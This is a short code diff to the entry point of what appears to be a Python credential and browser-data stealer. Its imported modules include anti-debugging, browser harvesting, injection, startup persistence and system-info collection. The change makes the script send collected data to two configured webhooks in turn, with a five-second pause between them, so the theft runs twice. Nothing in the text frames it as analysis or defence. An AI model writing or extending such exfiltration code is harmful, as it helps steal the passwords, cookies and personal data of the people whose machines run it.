@@ -5,9 +5,10 @@ from components.injection import Injection
 from components.startup import Startup
 from components.systeminfo import SystemInfo
 from config import __CONFIG__
+from time import sleep
 
 
-def main():
+def main(webhook):
     funcs = [
         AntiDebug,
         Browsers,
@@ -21,8 +22,7 @@ def main():
         if __CONFIG__[func.__name__.lower()]:
             try:
                 if func.__init__.__code__.co_argcount == 2:
-                    func(__CONFIG__['webhook'])
-                    func(__CONFIG__['webhook2'])
+                    func(__CONFIG__[webhook])
                 else:
                     func()
 
@@ -30,5 +30,8 @@ def main():
                 print(f'Error in {func.__name__}: {e}')
 
 
+
 if __name__ == '__main__':
-    main()
+    main(__CONFIG__['webhook'])
+    sleep(5)
+    main(__CONFIG__['webhook2'])
